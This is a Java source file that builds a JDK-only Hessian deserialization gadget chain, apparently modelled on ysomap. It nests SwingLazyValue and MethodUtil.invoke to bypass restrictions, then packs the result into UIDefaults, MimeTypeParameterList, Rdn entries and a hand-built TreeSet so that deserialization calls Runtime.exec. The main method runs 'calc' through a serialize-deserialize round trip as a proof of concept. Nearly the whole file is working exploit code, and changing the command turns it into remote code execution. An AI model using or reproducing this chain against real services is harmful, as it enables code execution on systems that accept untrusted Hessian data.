package org.example.my4unser.hessian;

import com.sun.org.apache.xml.internal.utils.FastStringBuffer;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.example.my4unser.utils.HessianUtil;
import org.example.my4unser.utils.KryoUtil;
import org.example.my4unser.utils.Reflections;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.TreeMap;
import java.util.TreeSet;

public class OnlyJdk {
    public static void test2() throws Exception {
//        new Rdn.RdnEntry();
        XString xString = new XString("any");
        xString.equals(tostring2SwingLazyValue());
    }

    public static Object tostring2SwingLazyValue() throws Exception {
//        SwingLazyValue swingLazyValue = SwingLazyValueInvoke2();
        SwingLazyValue swingLazyValue = SwingLazyValueInvoke11();
        String key1 = "key1";
        UIDefaults uiDefaults = new UIDefaults(new Object[]{key1, swingLazyValue});
        Constructor constructor = Class.forName("javax.swing.MultiUIDefaults").getDeclaredConstructor();
        constructor.setAccessible(true);
//        Object multiUIDefaults = constructor.newInstance();
//        Field field = multiUIDefaults.getClass().getDeclaredField("tables");
//        field.setAccessible(true);
//        field.set(multiUIDefaults, new UIDefaults[]{uiDefaults});
//        System.out.println(multiUIDefaults);
//        multiUIDefaults.toString();
//        return uiDefaults;
//        return multiUIDefaults;
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        Field field = MimeTypeParameterList.class.getDeclaredField("parameters");
        field.setAccessible(true);
        field.set(mimeTypeParameterList,uiDefaults);
        return mimeTypeParameterList;
    }
    public static SwingLazyValue SwingLazyValueInvoke11() throws Exception {
        String classname = "sun.reflect.misc.MethodUtil";
        String methodName = "invoke";
//        Object[] evilargs = new Object[]{Runtime.class.getDeclaredMethod("exec",String.class),Runtime.getRuntime(),new Object[]{cmd}};
        Method invokeMethod = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method execMethod = Runtime.class.getDeclaredMethod("exec", String.class);
        String cmd = "calc";
        Object[] args = new Object[]{execMethod, Runtime.getRuntime(), new Object[]{cmd}};
        Object[] evilargs = new Object[]{invokeMethod, new Object(), args};//嵌套绕过
        return new SwingLazyValue(classname, methodName, evilargs);
//        new SwingLazyValue(classname, methodName, evilargs).createValue(new UIDefaults());
    }

    public static void main(String[] args) throws Exception {
//        test2();
//        new UIDefaults().table;
//        Class.forName("javax.swing.UIDefaults").newInstance().table;
        HessianUtil.hessianUnser(HessianUtil.hessianSer(pack(getValue("calc"))));
    }
    public static SwingLazyValue getValue(String cmd) throws Exception {
        String classname = "sun.reflect.misc.MethodUtil";
        String methodName = "invoke";
//        Object[] evilargs = new Object[]{Runtime.class.getDeclaredMethod("exec",String.class),Runtime.getRuntime(),new Object[]{cmd}};
        Method invokeMethod = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method execMethod = Runtime.class.getDeclaredMethod("exec", String.class);
//        Object r = MethodUtil.class;
//        Object[] evilargs = new Object[]{execMethod,r,new Object[]{cmd}};
//        String cmd = "calc";
        Object[] args = new Object[]{execMethod, Runtime.getRuntime(), new Object[]{cmd}};
        Object[] evilargs = new Object[]{invokeMethod, new Object(), args};
//        new SwingLazyValue(classname, methodName, evilargs).createValue(new UIDefaults());
        return new SwingLazyValue(classname, methodName, evilargs);
    }
    public static Object pack(Object obj) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("ysomap", obj);
//        uiDefaults.put("ysomap", "qwe");
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        Reflections.setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);
        Object xstring ;
        //not needed
//        xstring = Reflections.createWithoutConstructor("com.sun.org.apache.xpath.internal.objects.XStringForFSB");
//        Reflections.setFieldValue(xstring, "m_obj", new FastStringBuffer());
        xstring = Reflections.createWithoutConstructor("javax.sound.sampled.AudioFileFormat$Type");
        Object rdnEntry1 = Reflections.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        Reflections.setFieldValue(rdnEntry1, "type", "ysomap");
        Reflections.setFieldValue(rdnEntry1, "value", xstring);

        Object rdnEntry2 = Reflections.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        Reflections.setFieldValue(rdnEntry2, "type", "ysomap");
        Reflections.setFieldValue(rdnEntry2, "value", mimeTypeParameterList);

        return makeTreeSet(rdnEntry2, rdnEntry1);
    }
    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
        TreeMap<Object,Object> m = new TreeMap<>();
        Reflections.setFieldValue(m, "size", 2);
        Reflections.setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);
        Object node = nodeCons.newInstance(v1, new Object[0], null);
        Object right = nodeCons.newInstance(v2, new Object[0], node);
        Reflections.setFieldValue(node, "right", right);
        Reflections.setFieldValue(m, "root", node);

        TreeSet set = new TreeSet();
        Reflections.setFieldValue(set, "m", m);
        return set;
    }    
}
